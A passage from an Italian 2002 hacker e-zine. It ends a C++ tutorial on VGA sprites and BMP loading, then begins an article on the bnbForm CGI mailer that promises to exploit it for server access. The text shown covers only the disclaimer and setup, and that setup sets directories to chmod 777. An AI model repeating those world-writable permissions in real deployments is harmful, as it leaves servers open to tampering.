|                                                                          |
|     void Sprite::Paint(int xx, int yy, unsigned char *buffer){           |
|         int i, j, buff = 0;                                              |
|         if(transparency){   //<-- tieni conto della trasparenza          |
|             for(j=yy, i=xx; j&lt;yy+height; j++, i=xx){                     |
|                 while(i&lt;xx+width){                                       |
|                     if(image[buff]!=transparency)                        |
|                         buffer[i+(j<<8)+(j<<6)] = image[buff];           |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }else{              //<-- nessuna trasparenza                    |
|             for(j=yy, i=xx; j&lt;yy+height; j++, i=xx){                     |
|                 while(i&lt;xx+width){                                       |
|                     buffer[i+(j<<8)+(j<<6)] = image[buff];               |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Piccola  ottimizzazione: anzichΦ  specificare  le  coordinate dove  lo   |
| sprite andrα stampato al  momento della chiamata alla  funzione Paint,   |
| conviene  specificare   le   coordinate   in   due    nuove  variabili   |
| all'interno  della  classe Sprite.   Questo risulta comodo quando  pi∙   |
| avanti vedremo la stampa automatizzata di una serie di sprite.           |
|                                                                          |
| Le modifiche da apportare sono minime:                                   |
|                                                                          |
| - aggiungiamo alla classe Sprite:                                        |
|                                                                          |
|     int x;                                                               |
|     int y;                                                               |
|                                                                          |
| - modifichiamo la Paint in questo modo:                                  |
|                                                                          |
|     void Sprite::Paint(unsigned char *buffer){                           |
|         int i, j, buff = 0;                                              |
|         if(transparency){                                                |
|             for(j=y, i=x; j&lt;y+height; j++, i=x){                         |
|                 while(i&lt;x+width){                                        |
|                     if(image[buff]!=transparency)                        |
|                         buffer[i+(j<<8)+(j<<6)] = image[buff];           |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }else{                                                           |
|             for(j=y, i=x; j&lt;y+height; j++, i=x){                         |
|                 while(i&lt;x+width){                                        |
|                     buffer[i+(j<<8)+(j<<6)] = image[buff];               |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
| Naturalmente  sono  da modificare  tutte  le chiamate  alla  Paint.      |
| Se   vogliamo stampare  uno sprite  'sp' a  partire dalle   coordinate   |
| (50,  100) dovremo scrivere:                                             |
|                                                                          |
|                                                                          |
|     sp->x = 50;                                                          |
|     sp->y = 100;                                                         |
|     sp->Paint(vga);                                                      |
|                                                                          |
|                                                                          |
| Importante   aggiungere    al   costruttore     due   istruzioni    di   |
| inizializzazione  per le coordinate:                                     |
|                                                                          |
|     x = 0;                                                               |
|     y = 0;                                                               |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   SPRiTE FUORi SCHERMO                                         |
|  | 11   |-------------------------------------------------------------   |
|  '------'                                                                |
| Non  sempre  tutto  quello  che dobbiamo  visualizzare  sullo  schermo   |
| si trova  necessariamente all'interno   dello schermo.   Pensiamo alle   |
| finestre all'interno della gui di un sistema  operativo:  solitamente,   |
| Φ possibile spostarle  anche al di fuori dello  schermo visibile.        |
| Nella   scrittura della  funzione   Paint,  quella incaricata  appunto   |
| della stampa degli   sprite,  non  abbiamo   tenuto conto  di   questa   |
| possibilitα   percui  se specifichiamo  una  coordinata  fuori   dallo   |
| schermo, o l'immagine va a  finire  fuori schermo perchΦ abbiamo fatto   |
| male i conti, potremmo ottenere strani risultati.                        |
| Per  sistemare  anche  questo aspetto,   ci  basta  fare un  controllo   |
| all'interno del ciclo di stampa:                                         |
|                                                                          |
|                                                                          |
|     void Sprite::Paint(unsigned char *buffer){                           |
|         int i, j, buff = 0;                                              |
|         if(transparency){                                                |
|             for(j=y, i=x; j&lt;y+height; j++, i=x){                         |
|                 while(i&lt;x+width){                                        |
|                     if((i<320&&i>0)&&(j<200&&j>0)){ //<- fuori schermo   |
|                         if(image[buff]!=transparency)                    |
|                             buffer[i+(j<<8)+(j<<6)] = image[buff];       |
|                     }                                                    |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }else{                                                           |
|             for(j=y, i=x; j&lt;y+height; j++, i=x){                         |
|                 while(i&lt;x+width){                                        |
|                     if((i<320&&i>0)&&(j<200&&j>0)){ //<- fuori schermo   |
|                         buffer[i+(j<<8)+(j<<6)] = image[buff];           |
|                     }                                                    |
|                     buff++;                                              |
|                     i++;                                                 |
|                 }                                                        |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Ovviamente dobbiamo  specificare le  dimensioni del  nostro schermo  o   |
| dell'area dove intendiamo effettivamente visualizzare gli sprite.        |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   iMMAGiNi                                                     |
|  | 11   |-------------------------------------------------------------   |
|  '------'                                                                |
| Prima di cominciare, facciamo  un piccolo discorso introduttivo  sulle   |
| immagini. Esistono  diversi  tipi  di  formati  per  le  immagini  che   |
| si   differenziano sostanzialmente  per  l'algoritmo  di compressione.   |
| L'immagine salvata   su file  Φ solitamente  compressa,  questo perchΦ   |
| se pensiamo di salvare  pixel per pixel un'immagine  avremmo  notevoli   |
| problemi   di   occupazione   in   memoria:  pensiamo  un'immagine  di   |
| 320x200 a  256 colori.   Ogni pixel  Φ identificato  da 1   solo byte,   |
| quindi la dimensione  totale del file  Φ data da  320*200*1 byte, cioΦ   |
| 64000  byte, circa  64 kbyte. Beh,  direte, non abbiamo  un file molto   |
| grosso...  proviamo  a fare  l'esempio  con un'immagine  di  800x600 a   |
| 65.536 colori: ogni pixel necessita di  2 byte e la dimensione  totale   |
| Φ 800*600*2 byte, ben 960000 byte, quasi un megabyte per un'immagine!    |
| Qui  entrano  in  gioco  gli  algoritmi  di  compressione,  capaci  di   |
| alleggerire notevolmente la dimensione del file salvato.                 |
| Visto che noi utilizzeremo solamente  una risoluzione di 320x200 e  al   |
| massimo 256  colori, possiamo  permetterci di  utilizzare immagini non   |
| compresse.                                                               |
|                                                                          |
| Esaminiamo come funziona il formato BMP, quello che solitamente usa il   |
| Paint di Windows.                                                        |
| BMP stα  per BitMaPped,   ossia  l'immagine  Φ  salvata   bit a   bit,   |
| non   c'Φ alcun  tipo di  compressione. Questo Φ vero solo  in  parte,   |
| nel senso che  esiste la  possibilitα di salvare l'immagine codificata   |
| con l'algoritmo RLE (Run Length Encoding).                               |
| Questo algoritmo si basa  sulla  'compressione' di sequenze  di colori   |
| uguali: ad  esempio, supponiamo  di avere  una riga  orizzontale rossa   |
| lunga 300 pixel; in base al RLE, in soly 3 byte possiamo dire 'da  qui   |
| in avanti disegna 300 pixel rossi', anzichΦ avere 300 byte che portano   |
| tutti il colore rosso.                                                   |
| Pur essendo un algoritmo  semplicissimo, noi non tratteremo  le bitmap   |
| codificate secondo RLE.                                                  |
| Il  file  codificato  in  bitmap  Φ  composto  da  un  header,   dalla   |
| palette e dall'immagine. L'header Φ   preceduto da un  tag di  2  byte   |
| che specifica  che il file Φ una bitmap.                                 |
| Analizziamo l'header direttamente dalla sua struttura corrispondente:    |
|                                                                          |
|                                                                          |
|     struct{                                                              |
|         unsigned long   fileLenght;                                      |
|         unsigned char   reserved[4];                                     |
|         unsigned long   imageOffset;                                     |
|         unsigned int    headerSize;                                      |
|         unsigned int    width;                                           |
|         unsigned int    height;                                          |
|         unsigned short  planes;                                          |
|         unsigned short  bitsPixel;                                       |
|         unsigned int    compression;                                     |
|         unsigned int    imageSize;                                       |
|         unsigned int    hResolution;                                     |
|         unsigned int    vResolution;                                     |
|         unsigned int    colors;                                          |
|         unsigned int    imColors;                                        |
|         unsigned char   padding[3];                                      |
|     }bmpheader;                                                          |
|                                                                          |
|                                                                          |
| Vediamo solo i parametri che utilizzeremo.                               |
| Innanzitutto  troviamo imageOffset  che ci  dice a  che  byte   inizia   |
| l'immagine  all'interno  del   file.  Lo  utilizzeremo    appunto  per   |
| individuare l'immagine e  poi leggerla.                                  |
| width  e  height  danno  rispettivamente  la  larghezza  e   l'altezza   |
| dell'immagine.                                                           |
| colors  indica   il  numero   di  colori   impiegati  per visualizzare   |
| l'immagine.                                                              |
|                                                                          |
| Subito dopo l'header, troviamo la definizione dei colori (la palette).   |
| PoichΦ   a  volte    non   sono  necessari    tutti   e  256    colori   |
| disponibili  per   rappresentare  un'immagine,  la  definizione  della   |
| palette contiene solo i colori modificati.                               |
| Il colore  Φ definito   da un  byte per   ogni colore primario (rosso,   |
| verde e blu) pi∙  un byte   di padding.  A noi  basta leggere   questi   |
| valori   e ridefinire   la palette  di  sistema.  Attenzione  per≥:  i   |
| byte non   sono scritti   a partire   dal rosso,  ma dal  blu; quindi,   |
| leggeremo   blu,  verde,  rosso   e  il  byte   di  padding.  Facciamo   |
| l'esempio di un colore:                                                  |
|                                                                          |
|                                                                          |
|     00 80 ff 00                                                          |
|     |  |  |  |                                                           |
|     B  G  R  pad.                                                        |
|                                                                          |
|                                                                          |
| Scriviamo due righe di codice per leggere la palette.                    |
|                                                                          |
|     outportb(0x3c8, 1);                                                  |
|     for(int i=0; i&lt;hdr.colors-1; i++){                                   |
|         fread(&b, sizeof(unsigned char), 1, img);                        |
|         fread(&g, sizeof(unsigned char), 1, img);                        |
|         fread(&r, sizeof(unsigned char), 1, img);                        |
|         fseek(img, 1, SEEK_CUR);                                         |
|         outportb(0x3c9, r>>2);                                           |
|         outportb(0x3c9, g>>2);                                           |
|         outportb(0x3c9, b>>2);                                           |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Per prima  cosa vediamo  che il  colore 0  non viene ridefinito perchΦ   |
| viene  inteso come nero e  non viene specificato all'interno del  file   |
| bitmap.                                                                  |
| Notiamo anche che i  valori r, g, e  b vengono shiftati a  destra di 2   |
| bit:  questo perchΦ, se ricordate,  ogni colore primario pu≥ avere  un   |
| valore  compreso tra  0  e  63.  Eseguendo   l'operazione  di   shift,   |
| abbiamo un  valore  di  6   bit:  se la matematica non  Φ un'opinione,   |
| 2^6 fa proprio 64...                                                     |
|                                                                          |
| Adesso   che  abbiamo   ridefinito   la   palette,  dobbiamo   leggere   |
| l'immagine. Basterebbe  leggere dal  primo all'ultimo  byte e copiarlo   |
| all'interno del  buffer, giusto?  Sbagliato! Questo  perchΦ l'immagine   |
| Φ salvata  a partire  dall'ultima riga, in questo modo:                  |
|                                                                          |
|                                                                          |
|     riga(n)                 <-- ultima riga                              |
|     riga(n-1)                                                            |
|     riga(n-2)                                                            |
|     ...                                                                  |
|     riga(n-altezzaimmagine) <-- prima riga                               |
|                                                                          |
|                                                                          |
| Non  si   capisce il    perchΦ  di  questa  scelta   nell'implementare   |
| l'algoritmo, comunque  non  Φ  un  problema.                             |
| Analizziamo  direttamente   il  codice    che legge  l'immagine e   la   |
| copia sulla memoria video.                                               |
|                                                                          |
|                                                                          |
|     fseek(img, hdr.imageOffset, SEEK_SET);                               |
|     if(hdr.compression==0){                                              |
|         for(int j=0; j&lt;hdr.height; j++){                                 |
|             for(int k=0; k&lt;hdr.width; k++){                              |
|                 fread(&pixel, sizeof(pixel), 1, img);                    |
|                 vga[k+(hdr.height-j-1)*320]=pixel;                       |
|             }                                                            |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Per prima cosa,  ci posizioniamo all'interno  del file alla  posizione   |
| specificata da  imageOffset.  Controlliamo  che  compression sia  pari   |
| a  0,  cioΦ  non  sia applicato   alcun algoritmo  di  compressione  e   |
| poi leggiamo pixel  per  pixel  e copiamo sulla memoria video.           |
| Quando  arriviamo  al  termine  della  riga,  continuando  a   leggere   |
| acquisiamo  i   dati  della  riga  precedente  da  visualizzare  sullo   |
| schermo.                                                                 |
|                                                                          |
| Facciamo  una  piccola  osservazione:   se  una  linea  Φ  memorizzata   |
| sequenzialmente, perchΦ andare  a leggere pixel  per pixel invece  che   |
| copiare direttamente tutta la riga?                                      |
| Ecco qui di seguito la versione ottimizzata della lettura:               |
|                                                                          |
|                                                                          |
|     fseek(img, hdr.imageOffset, SEEK_SET);                               |
|     if(hdr.compression==0){                                              |
|         for(int j=0; j&lt;hdr.height; j++){                                 |
|             fread(&vga[(hdr.height-j-1)*320], hdr.width, 1, img);        |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Per la stampa corretta  su schermo, e anche  per la corretta copia  in   |
| uno  sprite, ci basta  specificare come coordinata il  risultato della   |
| sottrazione  dell'altezza  dell'immagine e  il  contatore delle  righe   |
| lette e sottrarre ancora  1 per il fatto  che il conteggio delle  rige   |
| parte da 0:                                                              |
|                                                                          |
|                                                                          |
|     vga[k+(hdr.height-j-1)*320]=pixel;                                   |
|                                                                          |
|                                                                          |
| Il caricamento di  immagini in formato  BMP all'interno di  uno sprite   |
| non Φ pi∙ un problema.   A  questo   punto,  per≥,   si  presenta   un   |
| problema:   se   diamo un'occhiata  al codice,  quando allochiamo   un   |
| nuovo sprite  questo vuole   a priori  la dimensione  dell'immagine da   |
| allocare. PoichΦ quando noi allochiamo lo  sprite non abbiamo caricato   |
| ancora  l'immagine  da  file  e quindi  non  ne  conosciamo  ancora le   |
| dimensioni,  non  ci Φ  possibile  creare lo  sprite?  Possiamo. Basta   |
| definire  un nuovo costruttore della classe Sprite per il  caricamento   |
| di immagini da file.                                                     |
| Il   nuovo costruttore  necessiterα di un   unico parametro che   sarα   |
| il path  del file immagine da aprire:                                    |
|                                                                          |
|                                                                          |
|     Sprite::Sprite(const char *path){                                    |
|         FILE *img;                                                       |
|         bmpheader hdr;                                                   |
|                                                                          |
|         if((img=fopen(path, "rb"))==NULL){                               |
|             //impossibile aprire il file                                 |
|             return;                                                      |
|         }                                                                |
|         fseek(img, 2, SEEK_SET);                                         |
|         fread(&hdr, sizeof(bmpheader), 1, img);                          |
|                                                                          |
|         image = (unsigned char *)malloc(hdr.width*hdr.height);           |
|         width = hdr.width;                                               |
|         height = hdr.height;                                             |
|                                                                          |
|         outportb(0x3c8, 1);                                              |
|         for(int i=0; i&lt;hdr.colors-1; i++){                               |
|             fread(&b, sizeof(unsigned char), 1, img);                    |
|             fread(&g, sizeof(unsigned char), 1, img);                    |
|             fread(&r, sizeof(unsigned char), 1, img);                    |
|             fseek(img, 1, SEEK_CUR);                                     |
|             outportb(0x3c9, r>>2);                                       |
|             outportb(0x3c9, g>>2);                                       |
|             outportb(0x3c9, b>>2);                                       |
|         }                                                                |
|                                                                          |
|         fseek(img, hdr.imageOffset, SEEK_SET);                           |
|         if(hdr.compression==NULL){                                       |
|             for(int j=0; j&lt;hdr.height; j++){                             |
|                 fread(&image[(hdr.height-j-1)*hdr.width],                |
|                                                 hdr.width, 1, img);      |
|             }                                                            |
|         }                                                                |
|         fclose(img);                                                     |
|     }                                                                    |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   STAMPA AUTOMATiZZATA Di SPRiTE                               |
|  | 13   |-------------------------------------------------------------   |
|  '------'                                                                |
| Abbiamo creato uno   scenario complesso, con   parecchi sprite: adesso   |
| dobbiamo disegnarli sullo schermo.                                       |
| A  livello di  codice,  con  i mezzi  a  nostra  disposizione fino  a    |
| questo momento, dovremmo chiamare per ogni sprite la sua Paint.          |
|                                                                          |
| Esempio: abbiamo tre sprite sp1, sp2, sp3 da stampare.                   |
|                                                                          |
|                                                                          |
|     //...                                                                |
|     sp1->Paint(vga);                                                     |
|     sp2->Paint(vga);                                                     |
|     sp3->Paint(vga);                                                     |
|     //...                                                                |
|                                                                          |
|                                                                          |
| Questo  Φ un  notevole svantaggio   perchΦ dovremmo  conoscere giα  al   |
| momento  della  stesura del  codice  quanti e  quali  sprite  andranno   |
| stampati.                                                                |
| Vediamo di automatizzare   la stampa creando   una sorta di   database   |
| che  contiene  gli  sprite   da  stampare,   con  la   possibilitα  di   |
| aggiungerne e  toglierne dalla lista.  Tutto  ci≥  che ci  occorre   Φ   |
| un vettore  di  puntatori  a sprite  che dichiariamo:                    |
|                                                                          |
|                                                                          |
|     Sprite *SpriteRegister[5];                                           |
|                                                                          |
|                                                                          |
| Imponiamo il limite  di 5 sprite   per schermo perchΦ  nell'esempio ne   |
| usiamo  solo 3,  ma  possiamo  definirne quanti  ne  vogliamo  (sempre   |
| che  abbiamo abbastanza memoria!).                                       |
| Scriviamo la funzione per aggiungere  uno sprite al contenitore  degli   |
| sprite  da stampare:                                                     |
|                                                                          |
|                                                                          |
|     void AddSprite(Sprite *sp){                                          |
|         int counter=0;                                                   |
|         while((SpriteRegister[counter]!=NULL)&&(counter!=4)) counter++;  |
|         SpriteRegister[counter] = sp;                                    |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Dobbiamo  trovare  prima  di tutto  un  posto  libero all'interno  del   |
| contenitore dove piazzare  il  nuovo  sprite. Una  volta  trovato,  ci   |
| mettiamo  l'indirizzo dello sprite.                                      |
| Adesso  che  abbiamo  tutti gli  sprite  nel  contenitore, vediamo  la   |
| funzione che  li disegna tutti:                                          |
|                                                                          |
|                                                                          |
|     void DrawAllSprite(unsigned char *buffer){                           |
|         for(int i=0; i<4; i++){                                          |
|             if(SpriteRegister[i]) SpriteRegister[i]->Paint(buffer);      |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| La  funzione  Φ   semplicissima:  prende  tutti   gli  indirizzi   dal   |
| contenitore  degli  sprite e  chiama  la relativa  funzione  Paint. Il   |
| controllo 'if(SpriteRegister[i])'  serve  per   verificare   che   sia   |
| un   valore   non  nullo,    quindi  che   punti effettivamente  a uno   |
| sprite.                                                                  |
| Osservazione:  l'ultimo  sprite  stampato  sarα  sovrapposto  a  tutti   |
| gli altri, mentre il primo sarα  coperto da tutti gli  altri.  Abbiamo   |
| quindi una  stampa su pi∙ livelli.                                       |
| Facciamo adesso  un esempio  di 'stampa  automatizzata'.                 |
| Abbiamo   i 3 sprite di    prima sp1,   sp2 e   sp3.   Vediamo   prima   |
| il  codice per aggiungere e stampare gli sprite:                         |
|                                                                          |
|                                                                          |
|     AddSprite(sp1);                                                      |
|     AddSprite(sp2);                                                      |
|     AddSprite(sp3);                                                      |
|     DrawAllSprite(vga);                                                  |
|                                                                          |
|                                                                          |
| Semplicissimo, no? Ma se in un determinato istante uno sprite non deve   |
| comparire  sullo  schermo?  Se  volessimo   utilizzare questo   metodo   |
| 'automatizzato'  dovremmo rimuovere  lo sprite  dalla  lista  per non    |
| copiarlo   sul  buffer  video  ma,   invece,  introduciamo  un   altra   |
| proprietα  alla classe Sprite: la  visibilitα.                           |
| Aggiungiamo  una  variabile booleana   che  ci dice  se   lo sprite  Φ   |
| visibile  oppure no, quindi  se andrα stampato o meno.                   |
|                                                                          |
|                                                                          |
|     bool visible;                                                        |
|                                                                          |
|                                                                          |
| All'interno  dei costruttori  inizializziamo  'visible   = true'   per   |
| fare in  modo che lo sprite sia visibile di default.                     |
| Aggiungiamo  due  funzioni,   SetVisible  e  SetHidden,   alla  classe   |
| Sprite per modificare la visibilitα dello sprite.                        |
|                                                                          |
|                                                                          |
|     void Sprite::SetVisible(void){                                       |
|         visible = true;                                                  |
|     }                                                                    |
|                                                                          |
|                                                                          |
|     void Sprite::SetHidden(void){                                        |
|         visible = false;                                                 |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Scriviamo anche una funzione che ci dica se lo sprite Φ visibile:        |
|                                                                          |
|                                                                          |
|     bool Sprite::IsVisible(void){                                        |
|         return(visible);                                                 |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Adesso   che  abbiamo   questo  nuovo   parametro,  modifichiamo    la   |
| funzione DrawAllSprite in modo che stampi solo gli sprite visibili:      |
|                                                                          |
|                                                                          |
|     void DrawAllSprite(unsigned char *buffer){                           |
|         for(int i=0; i<12; i++){                                         |
|             if((SpriteRegister[i]->IsVisible())&&SpriteRegister[i])      |
|                 SpriteRegister[i]->Paint(buffer);                        |
|         }                                                                |
|     }                                                                    |
|                                                                          |
|                                                                          |
| Ci basta  verificare che  IsVisible sia   'true', quindi  lo sprite  Φ   |
| visibile  e in tal caso possiamo chiamare la funzione Paint.             |
|                                                                          |
|                                                                          |
|                                                                          |
|                                                                          |
|  .------.                                                                |
|  |      |-------------------------------------------------------------   |
|  |      |   CONCLUSiONi                                                  |
|  | 14   |-------------------------------------------------------------   |
|  '------'                                                                |
| Terminiamo  qui la prima  puntata.  Di materiale  mi sembra  ce ne sia   |
| abbastanza.                                                              |
| La prossima volta vedremo come stampare delle stringhe di testo e come   |
| definire dei font grafici; magari ci sarα qualche accenno alla SVGA...   |
|                                                                          |
| Per delucidazioni, consigli, insulti, proposte indecenti scrivetemi...   |
|                                                                          |
|                                                                          |
|      __/\__________________                                              |
|     '                      |                                             |
|     |   bondo@tiscali.it   |                                             |
|     |________________  ___.'                                             |
|                       \/                                                 |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'ANG0L0 DEGLi ExPL0iT                     #08 - 01/11/2002 |
| BNBF0RM: USi E ABUSi                                   [spyro] 0x0F/0x1A |
+--------------------------------------------------------------------------+
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
|                                                                          |
|  / -                                                                     |
|     |--> /Disclaimer                                                     |
|     |--> /Introduzione                                                   |
|     |--> /Cosa_Φ_il_bnbform                                              |
|     |--> /Config_e_installazione_bnbform                                 |
|     |--> /Exploitare_il_bnbform.cgi                                      |
|     |--> /Ringraziamenti_e_saluti                                        |
|                                                                          |
|  -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-   |
|                                                                          |
|                                                                          |
| bash# cd /Disclaimer                                                     |
| bash# cat disclaimer.txt                                                 |
|                                                                          |
|                                                                          |
| Quello che riporter≥ qui di seguito, sarα la spiegazione di un exploit   |
| che ha lo scopo di far  ottenere l'accesso ad un server tramite esso.    |
| Al giorno d'oggi la rete purtroppo Φ piena di lamer e io con questo      |
| testo non vorrei contribuire alla nascita di nuovi, quindi pensateci     |
| due volte prima di mettere in atto queste informazioni.                  |
| Io ho scritto questo testo soltanto per mettere in evidenza i problemi   |
| di sicurezza riguardanti la  rete.                                       |
| Quindi se farete danni a voi stessi o ad altre persone non mi            |
| riterr≥ responsabile.                                                    |
| Tutto a scopo informativo!                                               |
| Siete RESPONSABILI delle vostre azioni.                                  |
|                                                                          |
|                                                                          |
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
|                                                                          |
| bash# cd /Introduzione                                                   |
| bash# cat introduzione.txt                                               |
|                                                                          |
| Oggi vi parler≥ di un utilissimo,ma purtroppo anche buggatissimo, cgi    |
| script di nome: bnbForm                                                  |
| BnbForm Φ uno script cgi che permette di spedire delle e-mail            |
| direttamente da una pagina web, riempiendo una form.                     |
| Con questo testo andremo a scoprire come funziona lo script,             |
| come configurarlo, installarlo e come exploitarlo :)  .                  |
|                                                                          |
|                                                                          |
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
|                                                                          |
| bash# cd /Cosa_Φ_il_bnbform                                              |
| bash# cat cosa_Φ_il_bnbform.txt                                          |
|                                                                          |
|                                                                          |
| BnbForm Φ uno script cgi che permette di spedire delle e-mail            |
| direttamente da una pagina web, riempiendo una form.                     |
| Questo script pu≥ essere utilizzato sia su sistemi Unix che quelli       |
| windows, questo perchΦ necessita dell'uso dei socket.                    |
| Lo script in questione ha varie utilitα tipo: il supporto di destinatari | 
| multipli(Il campo Cc: di un client mail), controlla se l'indirizzo       |
| immesso Φ corretto (ma nn esistente!) e permette anche di inviare        |
| un messaggio a chi ha appena mandato una mail.                           |
|                                                                          |
|                                                                          |
|   -._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-  |
|                                                                          |
|                                                                          |
| bash# cd /Config_e_installazione_bnbform                                 |
| bash# cat config_e_installazione_bnbform.txt                             |
|                                                                          |
|                                                                          |
| Dopo aver scompattato il file .tar o .zip, ci troveremo una directory    |
| contenente 8 file di cui,  2 andranno messi nella directory cgi-bin      |
| del demone http e gli altri in una directory a nostra scelta.            |
|                                                                          |
|   File                     Description                                   |
|                                                                          |
| README.TXT                 No Comment :)                                 |
|                                                                          |
| bnbform.cgi                Script Cgi                                    |
|                                                                          |
| bnbform.txt                Form Html x utilizzare bnbform.cgi            |
|                                                                          |
| oops.html                  Pagina HTML per avviso errori                 |
|                                                                          |
| SSLNOTES.txt               Nota di uso dello script con SSL(https)       |
|                                                                          |
| bnbform.html               Semplice Form Html                            |
|                                                                          |
| mymessage.baut             Messaggio di autoreply                        |
|                                                                          |
| thanks.html                Pagina HTML x ringraziare dell'uso            |
|                                                                          |
|                                                                          |
| Iniziamo la configurazione editando il file bnbform.cgi .                |
| Prima di tutto andremo a settare delle variabili dello script.           |
|                                                                          |
| Se vogliamo garantire l'utilizzo dello script a soli determinati         |
| host, basta decommentare la riga qui di seguito e aggiungere gli host    |
| da noi desiderati:                                                       |
|                                                                          |
| #@okaydomains=("http://www.spyrohack.com", "http://www.diom.com");       |
|                                                                          |
| Un'altra variabile importante Φ questa:                                  |
|                                                                          |
| $SMTP_SERVER="localhost";                                                |
| #$SEND_MAIL="/usr/lib/sendmail -t";                                      |
|                                                                          |
| Serve a determinare chi tra  il demone SMTP o il prog. sendmail, deve    |
| avere l'incarico di mandare la posta.                                    |
| Se non Φ possibile utilizzare sendmail, non decommentare la riga,        |
| altrimenti in caso di possesso di tutti e 2 i programmi, abilitarli      |
| entrambi.                                                                |
|                                                                          |
| Ultima variabile importante Φ:                                           |
|                                                                          |
| $lockfile="/tmp/bnbform.lck";                                            |
|                                                                          |
| Come si pu≥ notare, questo file viene creato temporaneamente dallo       |
| script, quindi vα settata un path dove sia possibile che il cgi          |
| scriva.                                                                  |
| Sicuramente il cgi nn potrα scrivere nella dir. ti temp del server,      |
| quindi creare una directory nella vostra home.                           |
| Esempio:                                                                 |
|                                                                          |
| mkdir /home/spyro/tmp                                                    |
|                                                                          |
| Poi, diamogli tutti i permessi:                                          |
|                                                                          |
| chmod 777 /home/spyro/tmp                                                |
|                                                                          |
|                                                                          |
| Perfetto, con quest'ultima variabile, abbiamo completato la              |
| configurazione del file bnbform.cgi .                                    |
|                                                                          |
| Adesso passiamo alla modifica del file bnbform.html                      |
| Editiamolo con un qualsiasi editor testuale e se necessario,             |
| facciamo le seguenti modifiche.                                          |
|                                                                          |
| &lt;FORM METHOD="POST" ACTION="/cgi-bin/bnbform.cgi">                       |
|                                                                          |
| La stringa qui sopra citata,ha come path di default:                     |
|                                                                          |
| /cgi-bin/bnbform.cgi                                                     |
|                                                                          |
| Quindi se noi installiamo lo script in:                                  |
|                                                                          |
| /cgi-bin/bnbform/bnbform.cgi                                             |
|                                                                          |
|                                                                          |
| La stringa diventerα:                                                    |
|                                                                          |
| &lt;FORM METHOD="POST" ACTION="/cgi-bin/bnbform/bnbform.cgi">               |
|                                                                          |
| Di conseguenza modificare anche i link che dirigono verso le             |
| pagine di ringraziamento e errore:                                       |
|                                                                          |
| VALUE="http://domain.com/test/thanks.html">                              |
|                                                                          |
| VALUE="http://domain.com/test/oops.html">                                |
|                                                                          |
| Diventano:                                                               |
|                                                                          |
| VALUE="http://domain.com/bnbfile/thanks.html">                           |
|                                                                          |
| VALUE="http://domain.com/bnbfile/oops.html">                             |
|                                                                          |
|                                                                          |
| Infine cambiare anche il valore del sender(submit_to):                   |
|                                                                          |
| &lt;INPUT TYPE="HIDDEN" NAME="submit_to" VALUE="yourname@domain.com">       | 
|                                                                          |
| Fine della configurazione, che come si pu≥ notare, Φ molto               |
| semplice.                                                                |
|                                                                          |
|                                                                          |
| INSTALLAZIONE:                                                           |
|                                                                          |
| Anche l'installazione Φ una fase molto semplice.                         |
| Copiare i file "bnbform.cgi" e "mymessabe.baud" nella directory          |
|                                                                          |
| /cgi-bin/bnbform                                                         |
|                                                                          |
| Adesso dobbiamo sistemare le pagine html.                                |
| Andare nella propia directory public_html o html e creare la directory   |
| apposita:                                                                |
|                                                                          |
| cd public_html                                                           |
| mkdir bnbfile                                                            |
|                                                                          |
| Poi come al solito gli diamo i pieni permessi:                           |
|                                                                          |
| chmod 777 bnbfile                                                        |
|                                                                          |
| Entrare in quest'ultima directory e copiare tutti i file .html           |
|                                                                          |
| Stessa procedimento Φ possibile effettuandolo da ftp.                    |
|                                                                          |
| Finita l'installazione,apriamo il nostro broswer e colleghiamoci a:      |
|                                                                          |
| http://nostrosito.it/bnbform.htm                                         |
|                                                                          |
| altrimenti:                                                              |
|                                                                          |
| http://localhost/bnbform.htm                                             |
|                                                                          |
| (Dipende da dove avete montano lo script)                                |
| e controllare se lo script funzioni alla perfezione.                     |
| Dopo, modificare i campi necessari all'interno del file bnbform.html     |
| dove non sarα difficile identificare quali siano obbligatori o meno.     |
|                                                                          |
|                                                                          |
|                             FINE INSTALLAZIONE                           |
|                                                                          |
|                                                                          |
| P.s                                                                      |
| Ricordo che per usufruire di questo script cgi, come tutti del resto,    |
| Φ necessario che sul server sia presente un interprete perl.             |
| Per scaricarsi il file .tar o .zip del bnbform,recarsi all'url:          |
|                                                                          |
| http://bignosebird.com/                                                  |
|                                                                          |
| Pi∙ precisamente:                                                        |
|                                                                          |
| http://bignosebird.com/carchive/bnbform.shtml                            |
|                                                                          |
|                                                                          |
|                                                                          |
